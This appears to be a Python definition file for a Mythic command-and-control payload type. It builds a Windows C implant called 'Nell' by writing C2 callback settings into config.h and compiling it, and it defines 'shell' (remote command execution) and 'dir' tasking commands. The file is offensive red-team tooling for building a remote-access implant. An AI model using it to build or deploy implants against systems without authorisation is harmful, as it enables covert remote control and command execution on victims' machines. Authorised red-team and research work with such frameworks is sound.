import logging
import pathlib
import subprocess
import os
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json



class BasicPythonAgent(PayloadType):
    name = "Nell"
    file_extension = "exe"
    author = "@nxvh"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = """Basic Implant in C"""
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = False
    translation_container = 'NellTranslator'
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["exe", "exe_x86"],
            default_value="exe"
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Build with debug symbols and console output",
            default_value=False
        )
    ]
    agent_path = pathlib.Path(".") / "nell"
    agent_icon_path = agent_path / "agent_functions" / "rell.svg"
    agent_code_path = agent_path / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling", step_description="Building the agent executable")
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        build_msg = ""
        
        try:
            # ============================================================
            # Step 1: Gather C2 profile configuration
            # ============================================================
            
            c2_profile = None
            callback_host = "127.0.0.1"
            callback_port = 80
            callback_endpoint = "data"
            use_ssl = False
            
            # Extract C2 profile parameters
            for c2 in self.c2info:
                c2_profile = c2.get_c2profile()["name"]
                params = c2.get_parameters_dict()
                
                # Parse callback_host from URL
                if "callback_host" in params:
                    host_url = params["callback_host"]
                    # Remove protocol prefix
                    if host_url.startswith("https://"):
                        use_ssl = True
                        callback_host = host_url.replace("https://", "")
                    elif host_url.startswith("http://"):
                        use_ssl = False
                        callback_host = host_url.replace("http://", "")
                    else:
                        callback_host = host_url
                    # Remove trailing slash
                    callback_host = callback_host.rstrip("/")
                
                if "callback_port" in params:
                    callback_port = int(params["callback_port"])
                
                # Get the endpoint
                if "get_uri" in params:
                    callback_endpoint = params["get_uri"].lstrip("/")
                elif "post_uri" in params:
                    callback_endpoint = params["post_uri"].lstrip("/")
                
                build_msg += f"[*] C2 Profile: {c2_profile}\n"
                build_msg += f"[*] Host: {callback_host}:{callback_port}\n"
                build_msg += f"[*] Endpoint: /{callback_endpoint}\n"
                build_msg += f"[*] SSL: {use_ssl}\n"
                break  # Use first C2 profile only
            
            # ============================================================
            # Step 2: Generate config.h with stamped values
            # ============================================================
            
            config_path = self.agent_code_path / "config.h"
            
            config_content = f'''#ifndef CONFIG_H
            #define CONFIG_H

            #define CONFIG_INIT_UUID "{self.uuid}"
            #define CONFIG_HOSTNAME L"{callback_host}"
            #define CONFIG_ENDPOINT L"{callback_endpoint}"
            #define CONFIG_SSL {"TRUE" if use_ssl else "FALSE"}
            #define CONFIG_PROXY_ENABLED FALSE
            #define CONFIG_PROXY_URL L""

            #define CONFIG_USERAGENT L"Mozilla/5.0"
            #define CONFIG_HTTP_METHOD L"POST"
            #define CONFIG_PORT {callback_port}
            #define CONFIG_SLEEP_TIME 5  // seconds

            #endif // CONFIG_H
            '''
            
            with open(config_path, 'w') as f:
                f.write(config_content)
            
            build_msg += f"[+] Generated config.h with UUID: {self.uuid[:8]}...\n"
            
            # ============================================================
            # Step 3: Compile the agent
            # ============================================================
            
            output_format = self.get_parameter("output")
            debug_build = self.get_parameter("debug")
            
            # Determine make target
            if debug_build:
                make_target = "debug"
                output_file = "nell_debug.exe"
            elif output_format == "exe_x86":
                make_target = "x86"
                output_file = "nell32.exe"
            else:
                make_target = "all"
                output_file = "nell.exe"
            
            # Clean previous build
            proc = subprocess.run(
                ["make", "clean"],
                cwd=str(self.agent_code_path),
                capture_output=True,
                text=True
            )
            
            # Run make
            proc = subprocess.run(
                ["make", make_target],
                cwd=str(self.agent_code_path),
                capture_output=True,
                text=True
            )
            
            if proc.returncode != 0:
                resp.status = BuildStatus.Error
                resp.build_message = f"Compilation failed:\n{proc.stderr}\n{proc.stdout}"
                return resp
            
            build_msg += f"[+] Compilation successful\n"
            build_msg += proc.stdout
            
            # Read the compiled binary
            output_path = self.agent_code_path / output_file
            
            if not output_path.exists():
                resp.status = BuildStatus.Error
                resp.build_message = f"Output file not found: {output_file}"
                return resp
            
            with open(output_path, 'rb') as f:
                payload_bytes = f.read()
            
            # Set the payload
            resp.payload = payload_bytes
            resp.build_message = build_msg + f"[+] Payload size: {len(payload_bytes)} bytes\n"
            
        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_message = f"Build error: {str(e)}"
        
        return resp

class DirArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="path", 
                type=ParameterType.String, 
                description="Path to list"
            ),
        ]
    
    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a path to list")
        self.add_arg("path", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)

class ShellArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command", 
                type=ParameterType.String, 
                description="Command to run"
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a command to run")
        self.add_arg("command", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)

class ShellCommand(CommandBase):
    cmd = "shell"
    needs_admin = False
    help_cmd = "shell {command}"
    description = "This runs {command} in a terminal."
    version = 1
    author = "@nxvh"
    attackmapping = ["T1059"]
    argument_class = ShellArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = task.args.get_arg("command")
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

class DirCommand(CommandBase):
    cmd = "dir"
    needs_admin = False
    help_cmd = "dir {path}"
    description = "List directory contents at {path}."
    version = 1
    author = "@nxvh"
    argument_class = DirArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = task.args.get_arg("path")
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
